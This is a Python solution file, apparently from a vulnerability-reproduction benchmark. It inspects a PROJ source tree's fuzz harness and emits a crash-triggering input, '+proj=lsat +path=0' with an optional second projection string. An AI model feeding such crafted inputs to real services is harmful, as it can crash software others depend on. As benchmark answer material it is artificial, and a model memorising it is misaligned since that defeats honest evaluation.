import os
import re
import tarfile
from typing import Iterable, Optional, Tuple


class Solution:
    def _iter_source_files_from_tar(self, tar: tarfile.TarFile) -> Iterable[Tuple[str, bytes]]:
        members = [m for m in tar.getmembers() if m.isfile()]
        def score_name(n: str) -> int:
            ln = n.lower()
            s = 0
            if "fuzz" in ln or "fuzzer" in ln:
                s -= 50
            if "afl" in ln or "honggfuzz" in ln or "libfuzzer" in ln:
                s -= 20
            if "test" in ln:
                s -= 5
            if ln.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                s -= 2
            return s

        members.sort(key=lambda m: (score_name(m.name), m.size))
        for m in members:
            name = m.name
            ln = name.lower()
            if not ln.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                continue
            if m.size <= 0 or m.size > 800_000:
                continue
            try:
                f = tar.extractfile(m)
                if f is None:
                    continue
                data = f.read()
            except Exception:
                continue
            if data:
                yield name, data

    def _iter_source_files_from_dir(self, root: str) -> Iterable[Tuple[str, bytes]]:
        for dirpath, _, filenames in os.walk(root):
            for fn in filenames:
                ln = fn.lower()
                if not ln.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                    continue
                path = os.path.join(dirpath, fn)
                try:
                    st = os.stat(path)
                    if st.st_size <= 0 or st.st_size > 800_000:
                        continue
                    with open(path, "rb") as f:
                        data = f.read()
                except Exception:
                    continue
                if data:
                    yield path, data

    def _detect_input_format(self, files: Iterable[Tuple[str, bytes]]) -> Tuple[bool, Optional[bytes]]:
        """
        Returns:
            need_two: whether harness likely consumes two input strings
            sep: separator between strings if need_two is True (b'\n' or b'\0' or None)
        """
        best_need_two = False
        best_sep = None

        newline_pat = re.compile(rb"memchr\s*\([^,]+,\s*'\\n'\s*,|find\s*\(\s*'\\n'\s*\)|\\n")
        nul_pat = re.compile(rb"memchr\s*\([^,]+,\s*0\s*,|memchr\s*\([^,]+,\s*'\\0'\s*,|'\s*\\0\s*'")

        for _, data in files:
            if b"pj_init_plus" not in data and b"proj_create" not in data and b"LLVMFuzzerTestOneInput" not in data and b"main(" not in data:
                continue

            pj_init_cnt = data.count(b"pj_init_plus")
            proj_create_cnt = data.count(b"proj_create")
            create_cnt = pj_init_cnt + proj_create_cnt

            uses_fuzzer = (b"LLVMFuzzerTestOneInput" in data)
            uses_main = (b"main(" in data)

            if create_cnt >= 2 and (uses_fuzzer or uses_main):
                best_need_two = True
                if newline_pat.search(data):
                    best_sep = b"\n"
                    break
                if nul_pat.search(data):
                    best_sep = b"\0"
                    break
                best_sep = best_sep or b"\0"
            else:
                if b"proj_create_crs_to_crs" in data or b"proj_create_crs_to_crs_from_pj" in data:
                    best_need_two = True
                    if newline_pat.search(data):
                        best_sep = b"\n"
                        break
                    if nul_pat.search(data):
                        best_sep = b"\0"
                        break
                    best_sep = best_sep or b"\0"

        return best_need_two, best_sep

    def solve(self, src_path: str) -> bytes:
        s1 = b"+proj=lsat +path=0"
        s2 = b"+proj=eqc"

        need_two = False
        sep: Optional[bytes] = None

        try:
            if os.path.isdir(src_path):
                need_two, sep = self._detect_input_format(self._iter_source_files_from_dir(src_path))
            elif tarfile.is_tarfile(src_path):
                with tarfile.open(src_path, "r:*") as tar:
                    need_two, sep = self._detect_input_format(self._iter_source_files_from_tar(tar))
        except Exception:
            need_two, sep = False, None

        if need_two:
            if sep is None:
                sep = b"\0"
            return s1 + sep + s2

        return s1